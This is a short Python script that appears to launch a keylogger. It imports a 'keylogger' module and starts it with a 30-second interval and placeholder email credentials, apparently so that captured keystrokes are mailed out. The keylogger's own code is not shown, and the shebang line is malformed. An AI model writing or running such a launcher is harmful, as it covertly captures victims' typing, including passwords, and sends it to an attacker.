#! usr/bin/env python
# coding=utf-8

import keylogger

my_keylogger = keylogger.Keylogger(30, "user_email", "user_password")
my_keylogger.start()
